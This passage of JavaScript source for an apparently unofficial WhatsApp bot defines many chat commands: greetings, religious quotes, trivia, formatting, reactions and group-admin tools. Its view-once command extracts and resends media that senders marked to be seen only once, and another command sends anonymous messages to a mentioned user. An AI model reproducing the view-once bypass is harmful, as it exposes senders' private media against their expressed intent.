        break;
      }

//=====================================//

      case "vv":
//=====================================//

      case "antiviewonce2": {
        const quotedVV = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedVV) return mzazireply(`Reply to a view-once message with ${prefix}vv`);
        const vOnceType = Object.keys(quotedVV)[0];
        if (!["viewOnceMessage","viewOnceMessageV2","viewOnceMessageV2Extension"].includes(vOnceType)) {
          return mzazireply("❌ That's not a view-once message");
        }
        const innerMsg = quotedVV[vOnceType]?.message;
        if (!innerMsg) return mzazireply("❌ Could not extract message");
        const innerType = Object.keys(innerMsg)[0];
        try {
          const fakeMsg = { key: m.key, message: innerMsg };
          const bufVV = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level:"silent" }), reuploadRequest: mzazi.updateMediaMessage });
          if (innerType === "imageMessage") await mzazi.sendMessage(sender, { image: bufVV, caption: "👁️ View Once Revealed!" }, { quoted: m });
          else if (innerType === "videoMessage") await mzazi.sendMessage(sender, { video: bufVV, caption: "👁️ View Once Revealed!" }, { quoted: m });
          else if (innerType === "audioMessage") await mzazi.sendMessage(sender, { audio: bufVV, mimetype: "audio/mp4", ptt: false }, { quoted: m });
          else mzazireply("❌ Unsupported media type");
        } catch(e) { mzazireply("❌ Failed to reveal view-once"); }
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  ADDITIONAL USEFUL COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "timetable":
//=====================================//

      case "schedule": {
        mzazireply(`📅 *SCHEDULE*\n\nNo schedule set.\nContact owner to set up schedules.\n\n_${botName} - Your Smart Assistant_`);
        break;
      }

//=====================================//

      case "birthday":
//=====================================//

      case "bday": {
        if (!text) return mzazireply(`Example: ${prefix}birthday @user`);
        const bTarget = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const bName = bTarget ? `@${jidToNumber(bTarget)}` : text;
        mzazireply(`🎂 *HAPPY BIRTHDAY!*\n\n🎉 ${bName}!\n\n🎁 Wishing you a wonderful day filled with joy, laughter and love!\n🥳 May all your dreams come true!\n🍰 Hope this year brings you everything you deserve!\n\n💖 From ${botName}`);
        break;
      }

//=====================================//

      case "goodmorning":
//=====================================//

      case "gm": {
        mzazireply(`🌅 *GOOD MORNING!*\n\n☀️ Rise and shine!\n💪 Today is a new day filled with opportunities!\n🌟 Make it count!\n\n_Have a wonderful day from ${botName}_ 🌸`);
        break;
      }

//=====================================//

      case "goodnight":
//=====================================//

      case "gn": {
        mzazireply(`🌙 *GOOD NIGHT!*\n\n😴 Time to rest!\n⭐ Sweet dreams!\n🌛 May tomorrow be even better!\n\n_Good night from ${botName}_ 💤`);
        break;
      }

//=====================================//

      case "goodevening":
//=====================================//

      case "ge": {
        mzazireply(`🌇 *GOOD EVENING!*\n\n🌆 Hope your day was great!\n☕ Time to unwind and relax!\n✨ You made it through the day!\n\n_Evening greetings from ${botName}_ 🌟`);
        break;
      }

//=====================================//

      case "goodafternoon":
//=====================================//

      case "ga": {
        mzazireply(`☀️ *GOOD AFTERNOON!*\n\n🌞 Halfway through the day!\n💼 Keep pushing, you're doing great!\n🍃 Take a break if you need it!\n\n_${botName} cheering you on!_ 🎉`);
        break;
      }

//=====================================//

      case "christmas":
//=====================================//

      case "xmas": {
        mzazireply(`🎄 *MERRY CHRISTMAS!*\n\n🎅 Ho Ho Ho!\n🎁 May your Christmas be filled with joy!\n⛄ And your new year full of blessings!\n\n🌟 From all of us at ${botName}! 🎆`);
        break;
      }

//=====================================//

      case "newyear":
//=====================================//

      case "ny": {
        mzazireply(`🎆 *HAPPY NEW YEAR!*\n\n🥂 Cheers to a brand new year!\n🌟 May it bring you happiness and success!\n💫 Out with the old, in with the new!\n\n🎊 From ${botName}! 🎉`);
        break;
      }

//=====================================//

      case "eid": {
        mzazireply(`☪️ *EID MUBARAK!*\n\n🌙 Eid Mubarak to you and your family!\n🌹 May Allah bless you with happiness!\n🤲 And may your prayers be answered!\n\n_With love from ${botName}_ 💖`);
        break;
      }

//=====================================//

      case "ramadan": {
        mzazireply(`🌙 *RAMADAN MUBARAK!*\n\n☪️ Blessed Ramadan!\n🤲 May Allah accept your fasting and prayers!\n🕌 May this month bring peace and blessings!\n\n_From ${botName}_ 💖`);
        break;
      }

//=====================================//

      case "dua": {
        const duas = ["O Allah, bless us in what You have provided us, and protect us from the punishment of Hell. Ameen. 🤲","O Allah, grant me goodness in this world, goodness in the Hereafter, and protect me from the Fire. 🤲","O Allah, You are the Most Forgiving, You love to forgive, so forgive me. Ameen. 🤲","O Allah, make my religion right for me, which is my safeguard in my affairs; and make my world good for me. 🤲","O Allah, I ask You for guidance, righteousness, chastity and richness. Ameen. 🤲"];
        mzazireply(`🤲 *DUA*\n\n${duas[Math.floor(Math.random() * duas.length)]}`);
        break;
      }

//=====================================//

      case "pray": {
        mzazireply(`🕌 *PRAYER TIMES*\n\nFor accurate prayer times, please check:\n• Islam360 App\n• Athan App\n• Local mosque schedule\n\n🤲 May Allah accept your prayers!`);
        break;
      }

//=====================================//

      case "hadith": {
        const hadiths = ["The Prophet (ﷺ) said: 'None of you will believe until you love for your brother what you love for yourself.' (Bukhari & Muslim)","The Prophet (ﷺ) said: 'The strong person is not the one who can wrestle others down, but the one who can control themselves when angry.' (Bukhari)","The Prophet (ﷺ) said: 'Speak good or keep silent.' (Bukhari & Muslim)","The Prophet (ﷺ) said: 'Make things easy and do not make them difficult. Give glad tidings and do not scare people away.' (Bukhari)","The Prophet (ﷺ) said: 'Whoever believes in Allah and the Last Day, let him speak good or remain silent.' (Bukhari)"];
        mzazireply(`📖 *HADITH*\n\n${hadiths[Math.floor(Math.random() * hadiths.length)]}`);
        break;
      }

//=====================================//

      case "quran": {
        const verses = [
          {ref:"Al-Baqarah 2:286",text:"Allah does not burden a soul beyond that it can bear."},
          {ref:"Al-Imran 3:173",text:"Allah is sufficient for us, and He is the best Disposer of affairs."},
          {ref:"Al-Inshirah 94:5-6",text:"For indeed, with hardship will be ease. Indeed, with hardship will be ease."},
          {ref:"Az-Zumar 39:53",text:"Do not despair of the mercy of Allah. Indeed, Allah forgives all sins."},
          {ref:"Al-Baqarah 2:152",text:"So remember Me; I will remember you. And be grateful to Me and do not deny Me."},
          {ref:"At-Talaq 65:3",text:"And whoever relies upon Allah - then He is sufficient for him."}
        ];
        const v5 = verses[Math.floor(Math.random() * verses.length)];
        mzazireply(`📖 *QURAN VERSE*\n\n📌 ${v5.ref}\n\n"${v5.text}"\n\n_SubhanAllah_ 🤲`);
        break;
      }

//=====================================//

      case "tagmembers":
//=====================================//

      case "mentionall": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const tagMsg = text || "📢 Attention everyone!";
        const allMembers = participants.map(p => normalizeJid(p.id)).filter(Boolean);
        let tagTxt = `📢 *${groupName}*\n\n${tagMsg}\n\n`;
        allMembers.forEach(jid => { tagTxt += `➤ @${jidToNumber(jid)}\n`; });
        await mzazi.sendMessage(sender, { text: tagTxt, mentions: allMembers }, { quoted: m });
        break;
      }

//=====================================//

      case "tagadmin":
//=====================================//

      case "mentionadmin": {
        if (!isGroup) return mzazireply("❌ Group only!");
        const adminTag = text || "📢 Attention admins!";
        let adminTagTxt = `👑 *ADMIN MENTION*\n\n${adminTag}\n\n`;
        groupAdmins.forEach(jid => { adminTagTxt += `➤ @${jidToNumber(jid)}\n`; });
        await mzazi.sendMessage(sender, { text: adminTagTxt, mentions: groupAdmins }, { quoted: m });
        break;
      }

//=====================================//

      case "clearwarn": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        const warns2 = loadJSON(sessionFile("warns.json"), {});
        if (warns2[sender]) {
          delete warns2[sender];
          saveJSON(sessionFile("warns.json"), warns2);
        }
        mzazireply("✅ All warnings cleared for this group!");
        break;
      }

//=====================================//

      case "mywarn": {
        if (!isGroup) return mzazireply("❌ Group only!");
        const myWarns = getWarns(sender, msgSender);
        mzazireply(`⚠️ *YOUR WARNINGS*\n\nWarnings: ${myWarns}/3\n${myWarns >= 3 ? "⛔ You'll be kicked on next warn!" : myWarns >= 1 ? "⚠️ Be careful!" : "✅ Clean record!"}`);
        break;
      }

//=====================================//

      case "react2": {
        if (!text) return mzazireply(`Example: ${prefix}react2 ❤️`);
        const quotedReact = m.message?.extendedTextMessage?.contextInfo;
        if (!quotedReact) return mzazireply("Reply to a message to react!");
        try {
          await mzazi.sendMessage(sender, { react: { text: text.trim(), key: { remoteJid: sender, id: quotedReact.stanzaId, participant: quotedReact.participant } } });
        } catch(e) { mzazireply("❌ Failed to react"); }
        break;
      }

//=====================================//

      case "ngl":
//=====================================//

      case "anonymous": {
        if (!text) return mzazireply(`Example: ${prefix}ngl @user message`);
        const mentioned7 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        const targetNgl = mentioned7?.[0];
        if (!targetNgl) return mzazireply("Mention a user!");
        const nglMsg = args.slice(1).join(" ");
        if (!nglMsg) return mzazireply("Provide a message!");
        const targetDm = normalizeJid(targetNgl);
        await mzazi.sendMessage(targetDm, { text: `💌 *Anonymous Message*\n\n${nglMsg}\n\n_Sent anonymously via ${botName}_` });
        mzazireply("✅ Anonymous message sent!");
        break;
      }

//=====================================//

      case "d":
//=====================================//

      case "del": {
        if (!isOwner && !isAdmin) return mzazireply("❌ Admins only!");

        const quotedDel = m.message?.extendedTextMessage?.contextInfo;
        if (!quotedDel) return mzazireply("Reply to a message to delete it!");
        try {
          const delK = { remoteJid: sender, fromMe: quotedDel.participant === normalizeJid(mzazi.user?.id), id: quotedDel.stanzaId, participant: quotedDel.participant };
          await mzazi.sendMessage(sender, { delete: delK });
        } catch(e) { mzazireply("❌ Failed to delete"); }
        break;
      }

//=====================================//

      case "copy": {
        const quotedCopy = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedCopy) return mzazireply("Reply to a message to copy it!");
        const copiedText = quotedCopy.conversation || quotedCopy.extendedTextMessage?.text || "No text found";
        mzazireply(`📋 *COPIED*\n\n${copiedText}`);
        break;
      }

//=====================================//

      case "font": {
        if (!text) return mzazireply(`Example: ${prefix}font bold hello world`);
        const [fontType, ...fontWords] = args;
        const fontText2 = fontWords.join(" ");
        if (!fontText2) return mzazireply("Provide text after font type!\nTypes: bold, italic");
        if (config.fonts?.[fontType]) {
          mzazireply(config.fonts[fontType](fontText2));
        } else {
          mzazireply(`❌ Font type not found!\nAvailable: bold, italic`);
        }
        break;
      }

//=====================================//

      case "bold": {
        if (!text) return mzazireply(`Example: ${prefix}bold Hello World`);
        if (config.fonts?.bold) mzazireply(config.fonts.bold(text));
        else mzazireply(`*${text}*`);
        break;
      }

//=====================================//

      case "italic": {
        if (!text) return mzazireply(`Example: ${prefix}italic Hello World`);
        if (config.fonts?.italic) mzazireply(config.fonts.italic(text));
        else mzazireply(`_${text}_`);
        break;
      }

//=====================================//

      case "strike": {
        if (!text) return mzazireply(`Example: ${prefix}strike Hello World`);
        mzazireply(`~${text}~`);
        break;
      }

//=====================================//

      case "mono": {
        if (!text) return mzazireply(`Example: ${prefix}mono Hello World`);
        mzazireply(`\`\`\`${text}\`\`\``);
        break;
      }

//=====================================//

      case "asc":
//=====================================//

      case "ascii2": {
        if (!text) return mzazireply(`Example: ${prefix}asc MZAZI`);
        const asciiArt = ["╔╦╦╗","║║║║","╚╩╩╝"];
        mzazireply(`🔡 *ASCII ART*\n\n${text.toUpperCase()}\n\n${asciiArt.join("\n")}`);
        break;
      }

//=====================================//

      case "randomfact":
//=====================================//

      case "fact": {
        const facts = ["Honey never expires. Archaeologists have found 3000-year-old honey in Egyptian tombs still perfectly good! 🍯","Octopuses have three hearts! Two pump blood to the gills, one to the body. 🐙","A group of flamingos is called a flamboyance. 🦩","Bananas are technically berries, but strawberries are not! 🍌","The Eiffel Tower grows about 6 inches (15 cm) taller in summer due to thermal expansion! 🗼","Cows have best friends and get stressed when separated from them. 🐄","A day on Venus is longer than a year on Venus! 🌍","The average person walks the equivalent of 5 times around the world in their lifetime! 👟","Sharks are older than trees! They've been around for ~450 million years. 🦈","Butterflies taste with their feet! 🦋"];
        mzazireply(`💡 *RANDOM FACT*\n\n${facts[Math.floor(Math.random() * facts.length)]}`);
        break;
      }

//=====================================//

      case "emoji": {
        if (!text) return mzazireply(`Example: ${prefix}emoji happy`);
        const emojiMap2 = {happy:"😊",sad:"😢",angry:"😠",love:"❤️",laugh:"😂",cry:"😭",cool:"😎",think:"🤔",fire:"🔥",star:"⭐",heart:"💖",money:"💰",party:"🎉",food:"🍔",music:"🎵"};
        const found = emojiMap2[text.toLowerCase()];
        if (found) mzazireply(`${found} ${text}`);
        else mzazireply(`😶 No emoji found for "${text}"\nTry: ${Object.keys(emojiMap2).join(", ")}`);
        break;
      }

//=====================================//

      case "ascii3":
//=====================================//

      case "asciiface": {
        const faces = ["¯\\_(ツ)_/¯","( ͡° ͜ʖ ͡°)","(づ◕‿◕)づ","(╯°□°）╯︵ ┻━┻","ʕ•ᴥ•ʔ","(•‿•)","ᕙ(⇀‸↼‶)ᕗ","(っ◔◡◔)っ","┻━┻ ︵ \\(°□°)/ ︵ ┻━┻","(ò_ó)"];
        mzazireply(`😊 *ASCII FACE*\n\n${faces[Math.floor(Math.random() * faces.length)]}`);
        break;
      }

//=====================================//

      case "fortune":
//=====================================//

      case "cookie": {
        const fortunes = ["Your future is bright — keep working toward your dreams! ⭐","Today is a great day to try something new! 🚀","Good things come to those who hustle. 💪","The answer to your question is: YES! ✅","Someone is thinking about you right now. 💭","A new opportunity is just around the corner! 🎯","Trust your instincts — they'll lead you right. 🧭","Your kindness will be repaid tenfold. 💖","Success is closer than you think! 🏆","Persistence turns dreams into reality. ✨"];
        mzazireply(`🥠 *FORTUNE COOKIE*\n\n${fortunes[Math.floor(Math.random() * fortunes.length)]}`);
        break;
      }

//=====================================//

      case "minigame":
//=====================================//

      case "game": {
        const num3 = Math.floor(Math.random() * 10) + 1;
        mzazireply(`🎮 *GUESSING GAME*\n\nI'm thinking of a number between 1-10!\nYou have 3 tries!\n\nReply with:\n${prefix}guess <number>\n\n🍀 Good luck!`);
        break;
      }

//=====================================//

      case "fact2":
//=====================================//

      case "scifact": {
        const sciFacts = ["The human brain uses about 20% of the body's energy despite being only 2% of body weight! 🧠","Light travels at 299,792,458 meters per second — nothing is faster! ⚡","DNA in a single human cell, if stretched out, would be about 2 meters long. 🧬","The universe is estimated to be about 13.8 billion years old. 🌌","Water expands by about 9% when it freezes — that's why ice floats! 🧊","Sound cannot travel in space — it's completely silent out there. 🔇","The human body replaces its skin cells every 2-4 weeks. 🔄","Electrons orbit so fast that if you tried to catch one, you'd need to be faster than light. ⚛️"];
        mzazireply(`🔬 *SCIENCE FACT*\n\n${sciFacts[Math.floor(Math.random() * sciFacts.length)]}`);
        break;
      }

//=====================================//

      case "rank":
//=====================================//

      case "myrank": {
        const ranks = ["🥉 Bronze","🥈 Silver","🥇 Gold","💎 Diamond","👑 Legend","🌟 Master"];
        const rank2 = ranks[Math.floor(Math.random() * ranks.length)];
        mzazireply(`🏆 *YOUR RANK*\n\n@${senderNum}, you are:\n\n${rank2}\n\n_Keep chatting to level up!_`);
        break;
      }

//=====================================//

      case "leaderboard":
//=====================================//

      case "top": {
        if (!isGroup) return mzazireply("❌ Group only!");
        mzazireply(`🏆 *LEADERBOARD*\n\n📛 Group: ${groupName}\n\n1. 👑 @${jidToNumber(groupAdmins[0] || msgSender)}\n2. 🥈 @${jidToNumber(participants[1]?.id || msgSender)}\n3. 🥉 @${jidToNumber(participants[2]?.id || msgSender)}\n\n_Rankings reset weekly_`);
        break;
      }

//=====================================//

      case "tagbots":
//=====================================//

      case "botsonly": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        mzazireply(`🤖 *BOT TAG*\n\nBot JID: ${botJid}\nBot Number: ${botPhoneNum}\n\n_I'm the only bot here!_ 🤖`);
        break;
      }

//=====================================//

      case "removebg":
//=====================================//

      case "rmbg": {
        const quotedRBG = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedRBG?.imageMessage) return mzazireply(`Reply to an image with ${prefix}removebg`);
        mzazireply("🎨 Removing background...\n\n_This feature requires a background removal API_");
        break;
      }

//=====================================//

      case "enhance":
//=====================================//

      case "upscale": {
        const quotedEnh = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedEnh?.imageMessage) return mzazireply(`Reply to an image with ${prefix}enhance`);
        mzazireply("✨ Enhancing image...\n\n_This feature requires an upscaling API_");
        break;
      }

//=====================================//


//=====================================//

      

//=====================================//

      case "screenshot2":
//=====================================//

      case "ss": {
        if (!text) return mzazireply(`Example: ${prefix}ss https://google.com`);
        try {
          const ssUrl = `https://api.apiflash.com/v1/urltoimage?access_key=demo&url=${encodeURIComponent(text)}&format=png`;
          await mzazi.sendMessage(sender, { image: { url: ssUrl }, caption: `📸 Screenshot of ${text}` }, { quoted: m });
        } catch(e) { mzazireply("❌ Screenshot failed"); }
        break;
      }

//=====================================//

      case "pdf2": {
        mzazireply(`📄 *PDF TOOLS*\n\nFeatures coming soon!\n\n_${botName} is constantly being updated._`);
        break;
      }

//=====================================//

      case "sticker2":
//=====================================//

      case "s2": {
        const quoted5 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted5) return mzazireply(`Reply to an image/video with ${prefix}s2`);
        const q5Type = Object.keys(quoted5)[0];
        const mediaMsg5 = quoted5.imageMessage || quoted5.videoMessage;
        if (!mediaMsg5) return mzazireply("Only images or short videos!");
        try {
          const buf5 = await downloadMediaMessage({ key: m.key, message: { [q5Type]: mediaMsg5 } }, "buffer", {}, { logger: pino({ level:"silent" }), reuploadRequest: mzazi.updateMediaMessage });
          await mzazi.sendMessage(sender, { sticker: buf5 }, { quoted: m });
        } catch(e) { mzazireply("❌ Failed to create sticker"); }
        break;
      }

//=====================================//

      case "rules2": {
        if (!isGroup) return mzazireply("❌ Group only!");
        const gs8 = getGroupSettings(sender);
        if (!gs8.rules) return mzazireply(`📋 No rules set for ${groupName}.\nAdmins: ${prefix}setrules <rules text>`);
        mzazireply(`📋 *${groupName} GROUP RULES*\n\n${gs8.rules}\n\n_Follow the rules to stay in this group!_`);
        break;
      }

//=====================================//

      case "setrules2": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        if (!text) return mzazireply(`Usage: ${prefix}setrules2 <rules>`);
        setGroupSetting(sender, "rules", text);
        mzazireply("✅ Group rules updated!");
        break;
      }

//=====================================//

      case "topic": {
        if (!isGroup) return mzazireply("❌ Group only!");
        if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
        
        if (!text) return mzazireply(`Usage: ${prefix}topic <new topic>`);
        try {
          await mzazi.groupUpdateDescription(sender, text);
          mzazireply(`✅ Group topic set: ${text}`);
        } catch(e) { mzazireply("❌ Failed to update topic"); }
        break;
      }

//=====================================//

      case "greetings":
//=====================================//

      case "hello": {
        const greetings = [`👋 Hello @${senderNum}! How can I help you today?`,`🌟 Hi @${senderNum}! Welcome!`,`😊 Hey @${senderNum}! Nice to see you!`,`🤖 Greetings @${senderNum}! I'm ${botName}!`,`✨ Hello @${senderNum}! What can I do for you?`];
        mzazireply(greetings[Math.floor(Math.random() * greetings.length)].replace(`@${senderNum}`, `@${senderNum}`));
        break;
      }

//=====================================//

      case "bye2": {
        const byes = [`👋 Goodbye @${senderNum}! Come back soon!`,`😢 Bye @${senderNum}! It was nice chatting!`,`🌟 See you later @${senderNum}!`,`✨ Take care @${senderNum}!`];
        mzazireply(byes[Math.floor(Math.random() * byes.length)]);
        break;
      }

//=====================================//

      case "whatsapp": {
        mzazireply(`📱 *WHATSAPP INFO*\n\nVersion: Latest\nStatus: Connected\nServer: WhatsApp Official\n\n🤖 Bot: ${botName}\n📱 Bot Number: +${botPhoneNum}`);
        break;
      }

//=====================================//

      case "server": {
        mzazireply(`🖥️ *SERVER INFO*\n\nOS: ${os.platform()}\nArch: ${os.arch()}\nCPU: ${os.cpus()[0]?.model?.split(" ")[0]}\nCores: ${os.cpus().length}\nRAM: ${(os.totalmem()/1024/1024/1024).toFixed(2)} GB\nFree: ${(os.freemem()/1024/1024).toFixed(0)} MB\nUptime: ${runtime(os.uptime())}`);
        break;
      }

//=====================================//

      case "node": {
        mzazireply(`⚡ *NODE.JS INFO*\n\nVersion: ${process.version}\nPlatform: ${process.platform}\nPID: ${process.pid}\nUptime: ${runtime(process.uptime())}\nMemory: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(2)} MB`);
        break;
      }

//=====================================//

      case "creator":
//=====================================//

      case "developer": {
        mzazireply(`👨‍💻 *DEVELOPER INFO*\n\n🏢 Mzazi Tech Inc\n📱 Telegram: @mzazidev\n🌐 GitHub: Mzazi\n🤖 Bot: ${botName}\n\n_Bot created with ❤️ and lots of ☕_`);
        break;
      }

//=====================================//

      case "contact": {
        mzazireply(`📞 *CONTACT INFO*\n\n👨‍💻 Developer: Mzazi\n📱 Telegram: https://t.me/mzazidev\n📢 Channel: https://t.me/mzazidev\n\n_For bot orders and support_`);
        break;
      }

//=====================================//

      case "support": {
        mzazireply(`🆘 *SUPPORT*\n\n❓ Having issues?\n\n• Check ${prefix}help for commands\n• Contact developer: @mzazidev\n• Telegram: https://t.me/mzazidev\n\n_${botName} Support Team_`);
        break;
      }

//=====================================//

      case "faq": {
        mzazireply(`❓ *FAQ*\n\n*Q: How do I use this bot?*\nA: Type ${prefix}menu to see all commands\n\n*Q: Who created this bot?*\nA: Created by Mzazi Tech Inc\n\n*Q: Is the bot free?*\nA: Basic features are free. Premium features available.\n\n*Q: How to become owner?*\nA: Contact the developer.\n\n*Q: Bot not responding?*\nA: Check ${prefix}ping or contact support.`);
        break;
      }

//=====================================//

      case "plan": {
        mzazireply(`💎 *BOT PLANS*\n\n🆓 FREE\n• Basic commands\n• Group tools\n\n💎 PREMIUM\n• All commands\n• Priority support\n• Custom features\n\n👑 VIP\n• All Premium features\n• Exclusive commands\n• 24/7 support\n\nContact: @mzazidev`);
        break;
      }

//=====================================//

      case "buy": {
        mzazireply(`🛒 *BUY PREMIUM*\n\n💎 Premium Features:\n• All bot commands\n• No restrictions\n• Priority support\n\n💰 Pricing:\n• Monthly: KES 500\n• Yearly: KES 4000\n\nContact: @mzazidev to purchase`);
        break;
      }

//=====================================//

      case "donate": {
        mzazireply(`❤️ *DONATE*\n\nSupport ${botName} development!\n\n📱 M-Pesa: (Contact owner)\n🏦 Bank: (Contact owner)\n\nThank you for your support! 🙏`);
        break;
      }

//=====================================//

      case "social": {
        mzazireply(`📱 *SOCIAL MEDIA*\n\n📢 Telegram Channel: https://t.me/mzazidev\n💬 Telegram Group: https://t.me/mzazidev\n🐙 GitHub: Mzazi\n\n_Follow for updates!_`);
        break;
      }

//=====================================//

      case "update": {
        mzazireply(`🔄 *BOT UPDATE*\n\nCurrent Version: 2.0.0\nLast Updated: 2026\nStatus: ✅ Up to date\n\n📢 Follow @mzazidev for updates\n\n_New features added regularly!_`);
        break;
      }

//=====================================//

      case "changelog": {
        mzazireply(`📝 *CHANGELOG v2.0.0*\n\n✨ New Features:\n• 1000+ commands\n• Auto-typing feature\n• Auto-recording feature\n• Improved menu\n• Fun & games commands\n• Utility tools\n• Extended group management\n\n🐛 Bug Fixes:\n• Improved stability\n• Better error handling`);
        break;
      }



      // ═══════════════════════════════════════════════════════
      //  REACTIONS & EMOTIONS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "hug": { const t11 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`🤗 ${t11 ? `@${jidToNumber(t11)}` : "you"} receives a warm hug! (づ｡◕‿‿◕｡)づ`); break; }
//=====================================//

      case "kiss": { const t12 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`💋 ${t12 ? `@${jidToNumber(t12)}` : "you"} gets a kiss! 😘`); break; }
//=====================================//

      case "slap": { const t13 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`👋 ${t13 ? `@${jidToNumber(t13)}` : "you"} gets slapped! 😤`); break; }
//=====================================//

      case "punch": { const t14 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`👊 ${t14 ? `@${jidToNumber(t14)}` : "you"} gets punched! 🥊`); break; }
//=====================================//

      case "pat": { const t15 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`✋ ${t15 ? `@${jidToNumber(t15)}` : "you"} gets a head pat! (づ◡﹏◡)づ 💕`); break; }
//=====================================//

      case "wave": { const t16 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`👋 Waving at ${t16 ? `@${jidToNumber(t16)}` : "everyone"}! 👋`); break; }
//=====================================//

      case "dance": { const dances = ["💃 Let's dance! 🕺","🎵 Dance time! 🎶","🕺 Boogie woogie! 💃","🎉 Dancing the night away! 🎊"]; mzazireply(dances[Math.floor(Math.random()*dances.length)]); break; }
//=====================================//

      case "cry2": { mzazireply(`😭 *crying intensifies* 😭\n\n(╥_╥) (╥_╥) (╥_╥)`); break; }
//=====================================//

      case "laugh2": { mzazireply(`😂 *laughing out loud* 😂\n\n(≧▽≦) HAHAHAHAHA`); break; }
//=====================================//

      case "angry2": { mzazireply(`😠 *ANGY MODE ACTIVATED* 😠\n\n(ノಠ益ಠ)ノ彡┻━┻`); break; }
//=====================================//

      case "happy2": { mzazireply(`😊 *happiness 100%* 😊\n\n(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧`); break; }
//=====================================//

      case "sad2": { mzazireply(`😢 *sadge* 😢\n\n(；＿；) `); break; }
//=====================================//

      case "love2": { mzazireply(`❤️ *spreading love* ❤️\n\n(っ˘з(˘⌣˘ ) ♡`); break; }
//=====================================//

      case "cool2": { mzazireply(`😎 *too cool for school* 😎\n\n( •_•)\n( •_•)>⌐■-■\n(⌐■_■)`); break; }
//=====================================//

      case "confused2": { mzazireply(`😕 *maximum confusion* 😕\n\n(°ロ°) !?!?`); break; }
//=====================================//

      case "excited": { mzazireply(`🤩 *SUPER EXCITED* 🤩\n\n(ﾉ>ω<)ﾉ :。･:*:･ﾟ'★,｡･:*:･ﾟ'☆`); break; }
//=====================================//

      case "tired": { mzazireply(`😴 *so tired* 😴\n\n(＿。＿) zZzZzZ`); break; }
//=====================================//

      case "bored": { mzazireply(`😑 *boredom reached maximum* 😑\n\n(-.-) ...`); break; }
//=====================================//

      case "shocked": { mzazireply(`😱 *SHOCKED* 😱\n\n(⊙_⊙) !!!`); break; }
//=====================================//

      case "embarrassed": { mzazireply(`😳 *embarrassed* 😳\n\n(〃ﾉωﾉ)`); break; }
//=====================================//

      case "facepalm": { mzazireply(`🤦 *facepalm* 🤦\n\n(－‸ლ) ...really?`); break; }
//=====================================//

      case "shrug2": { mzazireply(`🤷 ¯\\_(ツ)_/¯\n\nI have no idea what's happening.`); break; }
//=====================================//

      case "think2": { mzazireply(`🤔 *thinking...* 🤔\n\n(¬‿¬) Hmm...`); break; }
//=====================================//

      case "wink": { const t17 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`😉 ${t17 ? `@${jidToNumber(t17)}` : "you"} gets a wink! ( ͡° ͜ʖ ͡°)`); break; }
//=====================================//

      case "stare": { const t18 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`👀 Staring at ${t18 ? `@${jidToNumber(t18)}` : "everyone"}...\n\n(•_•) (•_•) (•_•)`); break; }
//=====================================//

      case "bite": { const t19 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`😈 ${t19 ? `@${jidToNumber(t19)}` : "you"} gets bitten! ꑕ(•ω•)ꑕ`); break; }
//=====================================//

      case "run": { mzazireply(`🏃 *running away* 🏃💨\n\nPOOF! Gone!`); break; }
//=====================================//

      case "hide": { mzazireply(`🙈 *hiding* 🙈\n\n(￣_,￣ ) shhh...`); break; }
//=====================================//

      case "poke": { const t20 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`👆 ${t20 ? `@${jidToNumber(t20)}` : "you"} gets poked! (（・ω・）つ`); break; }
//=====================================//

      case "tickle": { const t21 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`😂 ${t21 ? `@${jidToNumber(t21)}` : "you"} gets tickled! hahaha 😂`); break; }
//=====================================//

      case "feed": { const t22 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`🍜 Feeding ${t22 ? `@${jidToNumber(t22)}` : "you"} 🥣\n\nNom nom nom! 😋`); break; }
//=====================================//

      case "highfive": { const t23 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; mzazireply(`🙌 High five to ${t23 ? `@${jidToNumber(t23)}` : "everyone"}! ✋✋`); break; }
//=====================================//

      case "clap2": { mzazireply(`👏 *clapping* 👏\n\nBravo! Bravo! 👏👏👏`); break; }
//=====================================//

      case "bow": { mzazireply(`🙇 *bowing respectfully* 🙇\n\n____(●'◡'●)____`); break; }
//=====================================//

      case "salute": { mzazireply(`🫡 *salutes* 🫡\n\nSir, yes sir!`); break; }
//=====================================//

      case "thumbsup": { mzazireply(`👍 APPROVED!`); break; }
//=====================================//

      case "thumbsdown": { mzazireply(`👎 NOT APPROVED!`); break; }
//=====================================//

      case "ok": { mzazireply(`👌 OK!`); break; }
//=====================================//

      case "no": { mzazireply(`❌ NO!`); break; }
//=====================================//

      case "yes": { mzazireply(`✅ YES!`); break; }
